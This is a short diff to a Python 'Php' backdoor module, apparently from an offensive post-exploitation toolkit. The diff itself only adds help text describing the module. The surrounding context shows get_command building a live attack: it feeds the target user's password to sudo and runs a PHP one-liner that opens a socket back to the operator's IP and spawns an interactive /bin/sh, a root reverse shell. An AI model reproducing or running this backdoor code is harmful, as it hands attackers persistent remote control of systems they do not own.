@@ -12,7 +12,7 @@ class Php(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {}
-        self.help_text = "" 
+        self.help_text = INFO + "Creates and runs a php backdoor which sends output to bash.\n"+INFO+"It does not automatically install a web server, but instead uses the php web module." 
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S php -r '$sock=fsockopen(\"" + self.core.localIP + "\"," + str(self.get_value("port")) + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
